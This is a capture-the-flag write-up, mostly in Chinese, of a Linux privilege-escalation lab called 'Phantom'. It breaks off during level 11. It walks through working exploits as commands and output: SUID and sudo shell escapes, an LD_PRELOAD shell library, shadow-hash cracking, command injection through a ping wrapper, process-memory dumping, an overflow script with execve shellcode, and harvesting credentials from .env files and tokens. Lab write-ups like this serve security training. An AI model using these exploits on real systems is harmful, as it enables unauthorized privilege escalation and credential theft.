# Phantom

## Act I — Escalation

## 00 Recon Gateway

```plaintext
 [ Phantom · Level 0 ]  Recon Gateway
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man5/proc.5.html
   https://man7.org/linux/man-pages/man1/uname.1.html
   https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
```

简单枚举一下

```shell
phantom0@phantom:~$ ls -laih
total 40K
2316862 drwx------ 1 phantom0 phantom0 4.0K Apr 21 14:12 .
2376746 drwxr-xr-x 1 root     root     4.0K Apr 21 11:17 ..
1436299 -rw-r--r-- 1 phantom0 phantom0  220 Jan  6  2022 .bash_logout
1436300 -rw-r--r-- 1 phantom0 phantom0 3.7K Jan  6  2022 .bashrc
2317632 drwx------ 2 phantom0 phantom0 4.0K Apr 21 14:12 .cache
1436298 -rw-r--r-- 1 phantom0 phantom0  807 Jan  6  2022 .profile
2315402 -rw-r--r-- 1 phantom0 phantom0  396 Apr 21 11:16 BRIEFING
phantom0@phantom:~$ cat BRIEFING 
PHANTOM OPERATIVE — MISSION BRIEFING
====================================

You have shell access on a compromised host.
Before you escalate, you need to know where you are.

Objective: Full situational awareness.
- What OS and kernel version is this?
- Who else is on this box?
- What services are running?
- What defenses are active?

The flag is hidden somewhere only a thorough recon finds.
```

顺着题目要求，进行枚举

```shell
# What OS and kernel version is this?
phantom0@phantom:~$ uname -a
Linux phantom 6.8.0-110-generic #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
phantom0@phantom:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.5 LTS
Release:        22.04
Codename:       jammy
phantom0@phantom:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

# Who else is on this box?
phantom0@phantom:~$ who -a
phantom0@phantom:~$ w
 14:31:46 up 1 day,  5:27,  0 users,  load average: 0.06, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
phantom0@phantom:~$ last
last: cannot open /var/log/wtmp: Permission denied

# What services are running?
phantom0@phantom:~$ ss -tulpn
-bash: /usr/bin/ss: Permission denied
phantom0@phantom:~$ netstat -tulpn
-bash: /usr/bin/netstat: Permission denied
phantom0@phantom:~$ ps auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1  15436  9396 ?        Ss   14:01   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 20-100 startups
root          27  0.0  0.0   3888  2120 ?        Ss   14:01   0:00 /usr/sbin/cron -P
root          31  0.0  0.0   7040  4144 ?        S    14:01   0:00 runuser -u phantom8 -- python3 -c  import sys, time secret = sys.stdin.readline().strip() sys.stdin.close() while True:     time.sleep(60) 
phantom8      36  0.0  0.0  13548  7888 ?        S    14:01   0:00  \_ python3 -c  import sys, time secret = sys.stdin.readline().strip() sys.stdin.close() while True:     time.sleep(60) 
root          32  0.0  0.1  13544  8000 ?        S    14:01   0:00 python3 -c  import time while True:     time.sleep(60) 
root          41  0.0  0.2  25516 19112 ?        S    14:01   0:00 python3 /usr/local/bin/docker-socket-emulator.py unix:/var/run/docker.sock
root          42  0.0  0.2  25516 19016 ?        S    14:01   0:00 python3 /usr/local/bin/docker-socket-emulator.py 0.0.0.0:2375
root          43  0.0  0.0   2792  1624 ?        S    14:01   0:00 phantom-host-init infinity
root          60  0.0  0.0   4364  1720 ?        S    14:01   0:00 /bin/bash /entrypoint.sh
root        1412  0.0  0.0   2792  1612 ?        S    14:32   0:00  \_ sleep 30
root         127  0.0  0.1  16896 10912 ?        Ss   14:01   0:00 sshd: phantom5 [priv]
phantom5     136  0.0  0.1  17168  8088 ?        S    14:01   0:00  \_ sshd: phantom5@pts/1
phantom5     137  0.0  0.0   5048  4024 pts/1    Ss+  14:01   0:00      \_ -bash
root         773  0.0  0.1  16896 10848 ?        Ss   14:12   0:00 sshd: phantom0 [priv]
phantom0     778  0.0  0.1  18484  9524 ?        S    14:12   0:00  \_ sshd: phantom0@pts/2
phantom0     779  0.0  0.0   5156  4160 pts/2    Ss+  14:12   0:00      \_ -bash
root        1135  0.0  0.1  16896 10824 ?        Ss   14:21   0:00 sshd: phantom5 [priv]
phantom5    1140  0.0  0.1  17168  8048 ?        S    14:21   0:00  \_ sshd: phantom5@pts/0
phantom5    1141  0.0  0.0   4628  3924 pts/0    Ss+  14:21   0:00      \_ -bash
root        1309  0.0  0.1  16896 10908 ?        Ss   14:28   0:00 sshd: phantom0 [priv]
phantom0    1317  0.0  0.1  17168  8120 ?        S    14:28   0:00  \_ sshd: phantom0@pts/3
phantom0    1318  0.0  0.0   5048  4096 pts/3    Ss   14:28   0:00      \_ -bash
phantom0    1420  0.0  0.0   7484  3288 pts/3    R+   14:32   0:00          \_ ps auxf
phantom0@phantom:~$ systemctl list-units --type=service --state=running
System has not been booted with systemd as init system (PID 1). Can't operate.
Failed to connect to bus: Host is down

# What defenses are active?
# 权限不足
```

索性直接上 `PEASS-ng` 进行枚举，发现

```plaintext
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root phantom0 26 Apr 21 11:16 /opt/.phantom_l0_flag
```

查看文件内容

```shell
phantom0@phantom:/home/svc_webapp/.aws$ cat /opt/.phantom_l0_flag
bl_phtm0_**hidden**
```

## 01 SUID Hunter

```plaintext
 [ Phantom · Level 1 ]  SUID Hunter
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man1/find.1.html
   https://en.wikipedia.org/wiki/Setuid
   https://book.hacktricks.xyz/linux-hardening/privilege-escalation
```

枚举一下

```shell
phantom1@phantom:~$ ls -laih
total 40K
2316863 drwx------ 1 phantom1 phantom1 4.0K Apr 21 14:56 .
2376746 drwxr-xr-x 1 root     root     4.0K Apr 21 11:17 ..
2314702 -rw-r--r-- 1 phantom1 phantom1  220 Jan  6  2022 .bash_logout
2314703 -rw-r--r-- 1 phantom1 phantom1 3.7K Jan  6  2022 .bashrc
2317665 drwx------ 2 phantom1 phantom1 4.0K Apr 21 14:56 .cache
2314701 -rw-r--r-- 1 phantom1 phantom1  807 Jan  6  2022 .profile
2315431 -rw-r--r-- 1 phantom1 phantom1  219 Apr 21 11:16 BRIEFING
phantom1@phantom:~$ cat BRIEFING 
MISSION: SUID Hunter
====================

Something on this system runs with more privilege than it should.
The flag belongs to another user. You cannot read it directly.

Find what has been misconfigured. Exploit it.
```

枚举一下 SUID

```shell
phantom1@phantom:~$ find / -perm -u=s -type f 2>/dev/null -exec ls -laih {} +
2315507 -rwsrwx--- 1 flagkeeper6 phantom6     66 Apr 21 14:01 /opt/maintenance/cleanup.sh
1442844 -rwsr-sr-x 1 daemon      daemon      55K Apr 14  2022 /usr/bin/at
1285051 -rwsr-xr-x 1 root        root        72K Feb  6  2024 /usr/bin/chfn
1285057 -rwsr-xr-x 1 root        root        44K Feb  6  2024 /usr/bin/chsh
1285119 -rwsr-xr-x 1 root        root        71K Feb  6  2024 /usr/bin/gpasswd
1285177 -rwsr-xr-x 1 root        root        47K Mar  6 16:10 /usr/bin/mount
1285182 -rwsr-xr-x 1 root        root        40K Feb  6  2024 /usr/bin/newgrp
1285193 -rwsr-xr-x 1 root        root        59K Feb  6  2024 /usr/bin/passwd
1285257 -rwsr-xr-x 1 root        root        55K Mar  6 16:10 /usr/bin/su
1441629 -rwsr-xr-x 1 root        root       227K Mar  2 13:08 /usr/bin/sudo
1285283 -rwsr-xr-x 1 root        root        35K Mar  6 16:10 /usr/bin/umount
1441059 -rwsr-xr-- 1 root        messagebus  35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
1438700 -rwsr-xr-x 1 root        root       331K Mar  4 17:55 /usr/lib/openssh/ssh-keysign
2315609 -rwsr-x--- 1 flagkeeper9 phantom9    16K Apr 21 11:17 /usr/local/bin/kern-tool
2316599 -rwsr-x--- 1 root        phantom22   17K Apr 21 11:17 /usr/local/bin/leaky-vessels
2315429 -rwsr-x--- 1 flagkeeper1 phantom1   276K Apr 21 11:16 /usr/local/bin/phantom-find
2315490 -rwsr-x--- 1 flagkeeper4 phantom4   5.7M Apr 21 11:16 /usr/local/bin/phantom-python3
2316853 -rwsr-x--x 1 root        root       993K Apr 20 14:16 /usr/local/bin/phantom-verify
2315565 -rwsr-x--- 1 flagkeeper7 phantom7    16K Apr 21 11:16 /usr/local/bin/system-checker
```

结合当前用户，就能明白需要做什么

```shell
phantom1@phantom:/tmp$ /usr/local/bin/phantom-find . -exec /bin/sh -p \; -quit
$ whoami && id
flagkeeper1
uid=1001(phantom1) gid=1001(phantom1) euid=1011(flagkeeper1) groups=1001(phantom1)
$ ls -laih /home/flagkeeper1
total 28K
2316911 drwx------ 1 flagkeeper1 flagkeeper1 4.0K Apr 21 11:16 .
2376746 drwxr-xr-x 1 root        root        4.0K Apr 21 11:17 ..
2315358 -rw-r--r-- 1 flagkeeper1 flagkeeper1  220 Jan  6  2022 .bash_logout
2315359 -rw-r--r-- 1 flagkeeper1 flagkeeper1 3.7K Jan  6  2022 .bashrc
2315357 -rw-r--r-- 1 flagkeeper1 flagkeeper1  807 Jan  6  2022 .profile
2315413 -rw------- 1 flagkeeper1 flagkeeper1   26 Apr 21 11:16 level1_flag
$ cat /home/flagkeeper1/level1_flag
bl_phtm1_**hidden**
```

## 02 Sudo Games

```plaintext
 [ Phantom · Level 2 ]  Sudo Games
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man.openbsd.org/sudoers.5
   https://man.openbsd.org/sudo.8
```

查看说明

```plaintext title="BRIEFING"
MISSION: Sudo Games
===================

Someone gave you sudo rights. But not to everything, and not to root.
Check what you can run — and as whom. Then make it do something it
was not meant to.

FLAG: owned by the user you can pivot to. Once you have that UID,
standard enumeration ("find files owned by <user>") points to it.
```

先枚举一下 `sudo`

```shell
phantom2@phantom:~$ sudo -l
Matching Defaults entries for phantom2 on phantom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User phantom2 may run the following commands on phantom:
    (flagkeeper2) NOPASSWD: /usr/bin/vim
```

那也很简单了

```shell
phantom2@phantom:~$ sudo -u flagkeeper2 /usr/bin/vim
```

进入之后 `ESC` 输入 `!sh` 即可获得终端

```shell
$ whoami && id
flagkeeper2
uid=1012(flagkeeper2) gid=1012(flagkeeper2) groups=1012(flagkeeper2)
```

然后定位 flag 位置

```shell
$ find / -user flagkeeper2 -type f 2>/dev/null
......
/var/lib/phantom-flags/level2_flag

$ cat /var/lib/phantom-flags/level2_flag
bl_phtm2_**hidden**
```

## 03 Inheritance

```plaintext
 [ Phantom · Level 3 ]  Inheritance
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man8/ld.so.8.html
   https://man.openbsd.org/sudoers.5  (env_keep, env_reset)
```

查看说明

```plaintext title="BRIEFING"
MISSION: Inheritance
====================

You can run one harmless command as another user. Sudo is strict
about which command you may run — but not about everything it
inherits from your shell when it starts.

Figure out what sudo is letting through, and carry something
dangerous in with it. A C compiler is present on this box.

FLAG: owned by the user sudo lets you impersonate — not root.
```

那就是很经典的依赖库注入了

先枚举一下

```shell
phantom3@phantom:~$ sudo -l
Matching Defaults entries for phantom3 on phantom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LD_PRELOAD

User phantom3 may run the following commands on phantom:
    (flagkeeper3) NOPASSWD: /usr/bin/id
```

构建攻击必要的库

```shell
phantom3@phantom:/tmp$ cat exploit.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

即可开始攻击

```shell
phantom3@phantom:/tmp$ gcc -fPIC -shared -o /tmp/pewpew.so exploit.c -nostartfiles
phantom3@phantom:/tmp$ sudo -u flagkeeper3 LD_PRELOAD=/tmp/pewpew.so /usr/bin/id
$ whoami && id
flagkeeper3
uid=1013(flagkeeper3) gid=1013(flagkeeper3) groups=1013(flagkeeper3)
```

然后定位 flag

```shell
$ find / -user flagkeeper3 -type f 2>/dev/null
......
/var/lib/phantom-flags/level3_flag
$ cat /var/lib/phantom-flags/level3_flag
bl_phtm3_**hidden**
```

## 04 Misplaced Power

```plaintext
 [ Phantom · Level 4 ]  Misplaced Power
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man7/capabilities.7.html
   https://man7.org/linux/man-pages/man8/getcap.8.html
```

查看说明

```plaintext title="BRIEFING"
MISSION: Misplaced Power
========================

Something on this system is a general-purpose interpreter that
should never have been shipped with SUID. It is NOT owned by
root — but it is owned by someone who can read more than you.

Enumerate the SUID binaries on this box. Understand which one
is out of place, and what it lets you do.

FLAG: owned by the same user as the misconfigured SUID binary.
```

枚举一下

```shell
phantom4@phantom:~$ find / -perm -u=s -type f 2>/dev/null -exec ls -laih {} + | grep phantom4
2315490 -rwsr-x--- 1 flagkeeper4 phantom4   5.7M Apr 21 11:16 /usr/local/bin/phantom-python3
```

那也很简单了

```shell
phantom4@phantom:~$ /usr/local/bin/phantom-python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ whoami && id
flagkeeper4
uid=1004(phantom4) gid=1004(phantom4) euid=1014(flagkeeper4) groups=1004(phantom4)
$ find / -user flagkeeper4 -type f 2>/dev/null
/home/flagkeeper4/.profile
/home/flagkeeper4/.bash_logout
/home/flagkeeper4/.bashrc
/usr/local/bin/phantom-python3
/var/lib/phantom-flags/level4_flag
$ cat /var/lib/phantom-flags/level4_flag
bl_phtm4_**hidden**
```

## 05 File Authority

```plaintext
 [ Phantom · Level 5 ]  File Authority
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man5/shadow.5.html
   https://manpages.debian.org/testing/passwd/groups.5.html
   https://hashcat.net/wiki/doku.php?id=example_hashes
```

查看说明

```plaintext title="BRIEFING"
MISSION: File Authority
=======================

Your user belongs to an interesting group. Groups determine what
you can access. Some groups should never be given to regular users.

Check your groups. Understand what they allow. Read what you
should not be able to read. Crack it.

Root is locked on this box — the only crackable hash in the shadow
file belongs to a different account, which is also your pivot target
and owns the flag.
```

枚举一下当前权限

```shell
phantom5@phantom:~$ whoami && id
phantom5
uid=1005(phantom5) gid=1005(phantom5) groups=1005(phantom5),42(shadow)
```

一眼丁真

```shell
phantom5@phantom:~$ cat /etc/shadow | grep 5:
phantom5:$y$j9T$Ig3BCbHkNi8yl9pJZ1uWl1$lHYkb0f1sgjam0b94hg/gDS.yUNUQw2MaMhkqh.vE8B:20564:0:99999:7:::
flagkeeper4:$y$j9T$.s4/Eyt41dnG4RdhRDfjx/$/7Y5ok0ASn1mWqAzMSe4hrOZcSKlO6HX3NVxPsbqno5:20564:0:99999:7:::
flagkeeper5:$y$j9T$p8rSJLWKlEBBM8zDPlbPq/$eXDxIKbvDNvGd4gGN2rNZ5MfjMs3i2wAkfMnVaZAPY.:20564:0:99999:7:::
phantom15:$y$j9T$MTYX79iDYEl0f0Cspeah./$EkZanlQ6YctMR8PSeYJJ4pndsPcpYYPchwgqSXRnV.A:20564:0:99999:7:::
phantom25:$y$j9T$ql1jo8BXl3Qz59keGtwGr0$MAh/sjCkIiwSLaZ23YqDXFc5hEneQVtO60t9Y4hPvR5:20564:0:99999:7:::
```

尝试对 `flagkeeper5` 的哈希爆破一下

```shell
┌──(randark㉿kali)-[~/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (?)     
1g 0:00:00:00 DONE (2026-04-22 10:36) 3.846g/s 369.2p/s 369.2c/s 369.2C/s 123456..yellow
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

成功得到

```shell
flagkeeper5@phantom:~$ cat /var/lib/phantom-flags/level5_flag
bl_phtm5_**hidden**
```

## 06 Scheduled Sins

```plaintext
 [ Phantom · Level 6 ]  Scheduled Sins
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man8/cron.8.html
   https://man7.org/linux/man-pages/man5/crontab.5.html
```

查看说明

```plaintext title="BRIEFING"
MISSION: Scheduled Sins
=======================

Something runs on this box on a schedule. Every minute.
Find what it is, who runs it (hint: it is not root), and whether
you can change it.

Patience is part of the skill. Wait for it.

FLAG: owned by the user running the scheduled job.
```

不确定是不是预期解，但是解出来了就行

```shell
phantom6@phantom:~$ cat /opt/maintenance/cleanup.sh
#!/bin/bash
find /tmp -name "*.tmp" -mtime +1 -delete 2>/dev/null
phantom6@phantom:~$ find / -mmin -2 -type f 2>/dev/null | grep -v "/proc\|/sys"
/tmp/flag.txt
/var/log/bl-persistent/lastlog
/var/log/bl-persistent/wtmp
phantom6@phantom:~$ ls -laih /tmp/flag.txt 
59991 -rw-rw-r-- 1 flagkeeper6 flagkeeper6 26 Apr 22 02:50 /tmp/flag.txt
phantom6@phantom:~$ cat /tmp/flag.txt
bl_phtm6_**hidden**
```

## 07 Local Authority

```plaintext
 [ Phantom · Level 7 ]  Local Authority
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man3/system.3.html
   https://owasp.org/www-community/attacks/Command_Injection
```

查看说明

```plaintext title="BRIEFING"
MISSION: Local Authority
========================

A custom system utility runs with elevated privileges. It looks
safe. It takes a hostname argument and checks it.

Examine how it processes your input. What if the input is not a
hostname?

FLAG: owned by the user the SUID binary runs as (check `ls -l`
on the binary — it is not root).
```

先枚举一下 suid

```shell
phantom7@phantom:~$ find / -perm -u=s -type f 2>/dev/null -exec ls -laih {} + | grep flagkeeper7
   4631 -rwsr-x--- 1 flagkeeper7 phantom7    16K Apr 21 16:45 /usr/local/bin/system-checker
phantom7@phantom:~$ file /usr/local/bin/system-checker
/usr/local/bin/system-checker: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=69f924e8d4d05cbddac82ec303cb6ff9149cbb05, for GNU/Linux 3.2.0, not stripped
```

将这个程序下到本地做反编译

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    __uid_t v4; // ebx
    __uid_t v5; // eax
    char s[264]; // [rsp+20h] [rbp-120h] BYREF
    unsigned __int64 v7; // [rsp+128h] [rbp-18h]

    v7 = __readfsqword(0x28u);
    if ( argc == 2 )
    {
        v4 = geteuid();
        v5 = geteuid();
        setreuid(v5, v4);
        snprintf(s, 0x100u, "ping -c 1 %s 2>/dev/null", argv[1]);
        printf("[*] Checking host: %s\n", argv[1]);
        if ( system(s) )
            puts("[-] Host is unreachable.");
        else
            puts("[+] Host is reachable.");
        return 0;
    }
    else
    {
        puts("Usage: system-checker <hostname>");
        puts("Checks if a host is reachable.");
        return 1;
    }
}
```

那就简单了

```shell
phantom7@phantom:~$ /usr/local/bin/system-checker "127.0.0.1; cat /var/lib/phantom-flags/level7_flag"
[*] Checking host: 127.0.0.1; cat /var/lib/phantom-flags/level7_flag
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
bl_phtm7_**hidden**
[+] Host is reachable.
```

## 08 Live Injection

```plaintext
 [ Phantom · Level 8 ]  Live Injection
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://man7.org/linux/man-pages/man5/proc.5.html  (environ, mem)
   https://man7.org/linux/man-pages/man2/ptrace.2.html
   https://sourceware.org/gdb/current/onlinedocs/gdb/
```

查看说明

```plaintext title="BRIEFING"
MISSION: Live Injection
=======================

A long-running process holds a secret in memory and never writes
it to disk. You can see the process via /proc and, with the right
capability, you can read what it is doing from the outside.

Memory is more honest than the filesystem. Read it.

The daemon runs as your own UID (phantom8) — /proc access is
same-uid, no root required.
```

枚举一下进程

```shell
phantom8@phantom:~$ ps aux | grep phantom8 | grep -v "grep\|bash\|ps"
root          30  0.0  0.0   7040  4240 ?        S    Apr21   0:00 runuser -u phantom8 -- python3 -c  import sys, time, ctypes # yama ptrace_scope=1 on Ubuntu blocks same-uid ptrace attach unless the # tracee explicitly opts in via PR_SET_PTRACER (or scope=0 globally). The # container inherits the host's read-only /proc/sys/kernel/yama, so we # can't set scope=0 from the entrypoint. Opt in from inside the daemon: # PR_SET_PTRACER = 0x59616d61, PR_SET_PTRACER_ANY = (unsigned long)-1. libc = ctypes.CDLL(None) libc.prctl(0x59616d61, ctypes.c_ulong(-1).value, 0, 0, 0) secret = sys.stdin.readline().strip() sys.stdin.close() while True:     time.sleep(60) 
phantom8      35  0.0  0.1  13772  8576 ?        S    Apr21   0:00 python3 -c  import sys, time, ctypes # yama ptrace_scope=1 on Ubuntu blocks same-uid ptrace attach unless the # tracee explicitly opts in via PR_SET_PTRACER (or scope=0 globally). The # container inherits the host's read-only /proc/sys/kernel/yama, so we # can't set scope=0 from the entrypoint. Opt in from inside the daemon: # PR_SET_PTRACER = 0x59616d61, PR_SET_PTRACER_ANY = (unsigned long)-1. libc = ctypes.CDLL(None) libc.prctl(0x59616d61, ctypes.c_ulong(-1).value, 0, 0, 0) secret = sys.stdin.readline().strip() sys.stdin.close() while True:     time.sleep(60) 
root       12040  0.0  0.0   7588  4976 pts/3    S    02:13   0:00 su - phantom8
root       42980  0.0  0.1  16892 10836 ?        Ss   03:00   0:00 sshd: phantom8 [priv]
phantom8   42991  0.0  0.1  17316  8328 ?        S    03:00   0:00 sshd: phantom8@pts/0
```

那也很简单，只需要转储完整进程，然后上 strings 就可以

```shell
# 附加到进程
gdb -p 13772

# 直接 dump 内存到文件进行分析
(gdb) generate-core-file /tmp/mem.bin
(gdb) quit
```

然后

```shell
phantom8@phantom:~$ strings /tmp/mem.bin | tail -n 10
pd|/
 5|/
0h|/
@n|/
6}X%0
KSXE
 5|/
CddJn
<module>
bl_phtm8_**hidden**
```

## 09 Stack Day

```plaintext
 [ Phantom · Level 9 ]  Stack Day
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://en.wikipedia.org/wiki/Buffer_overflow
   https://github.com/slimm609/checksec.sh
   https://ir0nstone.gitbook.io/notes/binexp
```

查看说明

```plaintext title="BRIEFING"
phantom9@phantom:~$ cat BRIEFING 
MISSION: Stack Day
==================

A SUID diagnostic utility takes a single argument and copies it,
unchecked, into a fixed-size buffer. The binary is not owned by
root — it is owned by the same account that holds the flag, which
is all you need.

Enumerate the mitigations first, then write the rest. This is a
memory-corruption exercise at the userland level; kernel-CVE
exploitation lives in the Flux track.

gcc and gdb are available on this box.
```

首先

```shell
phantom9@phantom:~$ gdb -batch -ex 'break check_module' -ex 'run TEST' -ex 'printf "dest_addr: %p\n", $rbp-0x40' /usr/local/bin/kern-tool
Breakpoint 1 at 0x40117e
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[*] Kernel diagnostic tool v1.0

Breakpoint 1, 0x000000000040117e in check_module ()
dest_addr: 0x7ffd8e4affa0
```

但是远程环境中开了 ASLR 地址随机化

```SHELL
phantom9@phantom:/tmp$ gdb -q /usr/local/bin/kern-tool
Reading symbols from /usr/local/bin/kern-tool...
(No debugging symbols found in /usr/local/bin/kern-tool)
(gdb) run $(python3 -c "print('A'*72 + 'BBBBBBBB')")
Starting program: /usr/local/bin/kern-tool $(python3 -c "print('A'*72 + 'BBBBBBBB')")
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[*] Kernel diagnostic tool v1.0
[*] Checking kernel module: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
[-] Module not found.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011c5 in check_module ()
```

感谢 雪殇 的 super-ccb-agent

![img](img/image_20260412-141238.png)

```python
#!/usr/bin/env python3
import subprocess
import sys


FLAG_PATH = b"/var/lib/phantom-flags/level9_flag"
CMDS = b"id\ncat " + FLAG_PATH + b"\nexit\n"

# 64-byte payload:
# - len=64 causes strcpy() to zero only the low byte of saved RBP
# - when main's original RBP low byte is 0x70, leave; ret pivots to main_rbp-0x70
# - [main_rbp-0x68] holds argv[1], so ret jumps straight to this shellcode
SHELLCODE = bytes.fromhex(
    "31d25248bb2f2f62696e2f7368534889e731c066b82d7050"
    "4889e65256574889e6b03b0f05"
)
PAYLOAD = SHELLCODE + b"\x90" * (64 - len(SHELLCODE))


def main():
    attempts = int(sys.argv[1]) if len(sys.argv) > 1 else 64
    for i in range(1, attempts + 1):
        p = subprocess.run(
            [b"/usr/local/bin/kern-tool", PAYLOAD],
            input=CMDS,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        out = p.stdout
        sys.stdout.buffer.write(b"=== attempt %d rc=%d ===\n" % (i, p.returncode))
        sys.stdout.buffer.write(out[:800])
        if b"flagkeeper9" in out and FLAG_PATH in out:
            return
        if b"flag{" in out or b"FLAG{" in out or b"phantom" in out:
            return


if __name__ == "__main__":
    main()
# bl_phtm9_**hidden**
```

## 10 The Harvest

```plaintext
 [ Phantom · Level 10 ]  The Harvest
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://github.com/trufflesecurity/trufflehog
   https://blog.gitguardian.com/secrets-in-shell-history/
   https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html
```

查看说明

```plaintext title="BRIEFING"
MISSION: The Harvest
===================

You are root on this box. But root on one machine is nothing.
The real value is what this machine knows about OTHER systems.

Find every credential on this box: passwords, tokens, keys, secrets.
One of them is the flag for the next level.

Check: history files, config files, environment variables,
SSH keys, application configs, process memory.
```

在使用 `PEASS-ng` 进行探测的时候，发现

```plaintext
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 root root 146 Apr 21 11:17 /opt/webapp/.env
DB_HOST=db.internal
DB_USER=webapp
DB_PASS=bl_phtm10_**hidden**
DB_NAME=production
REDIS_URL=redis://localhost:6379
SECRET_KEY=a1b2c3d4e5f6
```

## 11 Token Hunter

```plaintext
 [ Phantom · Level 11 ]  Token Hunter
 Full brief:  cat ~/BRIEFING
 ─────────────────────────────────────────────
 If you're stuck — read up on the topic, then come back:
   https://jwt.io/introduction
   https://docs.aws.amazon.com/sdkref/latest/guide/file-format.html
   https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
```

查看说明

```plaintext title="BRIEFING"
phantom11@phantom:~$ cat BRIEFING 
MISSION: Token Hunter
====================

Credentials are not just passwords. Modern systems use tokens.
JWT, API keys, cloud credentials, service account tokens.

This machine connects to cloud services and internal APIs.
Find every token. Decode what you can. One token is the flag.
```

枚举一下环境

```shell
phantom11@phantom:~$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IkN1OHRBS0g3T0k2dHlhYjd3In0.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.FAKE_TOKEN
phantom11@phantom:~$ ls -laih ~/.aws/
ls: cannot access '/home/phantom11/.aws/': No such file or directory
```

使用 `PEASS-ng` 进行枚举后，注意到

```plaintext
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r----- 1 root phantom10 146 Apr 22 21:38 /opt/webapp/.env
-rw-r----- 1 root phantom11 36 Apr 22 21:38 /opt/webapp/repo/.env
APP_SECRET=REDACTED
DB_URL=REDACTED

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-x--- 8 root phantom11 4096 Apr 22 21:38 /opt/webapp/repo/.git

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/svc_webapp/.aws
/home/svc_webapp/.aws/credentials
/root/
```

查看一下 aws 的

